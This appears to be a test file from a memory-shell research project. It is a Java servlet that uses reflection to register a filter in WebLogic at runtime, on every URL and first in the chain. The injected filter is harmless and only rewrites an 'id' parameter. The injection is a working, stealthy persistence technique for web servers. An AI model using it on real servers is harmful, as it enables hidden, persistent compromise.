package org.su18.memshell.test.weblogic;

import weblogic.servlet.internal.FilterManager;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.servlet.utils.ServletMapping;
import weblogic.utils.collections.MatchMap;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Map;

/**
 * 来自项目 https://github.com/feihong-cs/memShell
 * 亲测有效
 * 测试版本 WebLogic 12.2.1.3.0
 *
 * @author su18
 */
public class AddWeblogicFilter extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) {

		//为了兼容低版本的 weblgoic，所以有些逻辑（如排序）没法利用现成的 api，因为老版本不持
		try {
			String filterName = "dynamicFilter1";
			String urlPattern = "/*";

			Field contextField = req.getClass().getDeclaredField("context");
			contextField.setAccessible(true);
			WebAppServletContext servletContext = (WebAppServletContext) contextField.get(req);
			FilterManager        filterManager  = servletContext.getFilterManager();

			// 判断一下，防止多次加载， 默认只加载一次，不需要重复加载
			if (!filterManager.isFilterRegistered(filterName)) {

				//将 Filter 注册进 FilterManager
				//参数： String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
				Method registerFilterMethod = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
				registerFilterMethod.setAccessible(true);
				registerFilterMethod.invoke(filterManager, filterName, TestFilter.class.getName(), new String[]{urlPattern}, null, null, null);


				//将我们添加的 Filter 移动到 FilterChian 的第一位
				Field filterPatternListField = filterManager.getClass().getDeclaredField("filterPatternList");
				filterPatternListField.setAccessible(true);
				ArrayList filterPatternList = (ArrayList) filterPatternListField.get(filterManager);


				//不能用 filterName 来判断，因为在 11g 中此值为空，在 12g 中正常
				for (int i = 0; i < filterPatternList.size(); i++) {
					Object filterPattern = filterPatternList.get(i);
					Field  f             = filterPattern.getClass().getDeclaredField("map");
					f.setAccessible(true);
					ServletMapping mapping = (ServletMapping) f.get(filterPattern);

					f = mapping.getClass().getSuperclass().getDeclaredField("matchMap");
					f.setAccessible(true);
					MatchMap matchMap = (MatchMap) f.get(mapping);

					Object result = matchMap.match(urlPattern);
					if (result != null && result.toString().contains(urlPattern)) {
						Object temp = filterPattern;
						filterPatternList.set(i, filterPatternList.get(0));
						filterPatternList.set(0, temp);
						break;
					}
				}

				resp.getWriter().println("weblogic filter added");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static class TestFilter implements Filter {

		/**
		 * 初始化 filter
		 *
		 * @param filterConfig FilterConfig
		 */
		@Override
		public void init(FilterConfig filterConfig) {
		}

		/**
		 * doFilter 方法处理过滤器逻辑
		 *
		 * @param servletRequest  ServletRequest
		 * @param servletResponse ServletResponse
		 * @param filterChain     FilterChain
		 * @throws IOException      抛出异常
		 * @throws ServletException 抛出异常
		 */
		@Override
		public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
			// 给下一个过滤器
			filterChain.doFilter(new AddWeblogicFilter.TestFilter.FilterRequest((HttpServletRequest) servletRequest), servletResponse);
		}

		/**
		 * 销毁时执行的方法
		 */
		@Override
		public void destroy() {
		}

		/**
		 * 自定义 FilterRequest 重写 getParameter 方法处理 id 值
		 */
		class FilterRequest extends HttpServletRequestWrapper {

			public FilterRequest(HttpServletRequest request) {
				super(request);
			}

			@Override
			public String getParameter(String name) {
				if ("id".equals(name)) {
					String originalId = super.getParameter(name);

					if (originalId != null && !originalId.isEmpty()) {
						int idNum = (Integer.parseInt(originalId) + 1000000000);
						return Integer.toString(idNum);
					}
				}
				return super.getParameter(name);
			}
		}
	}

}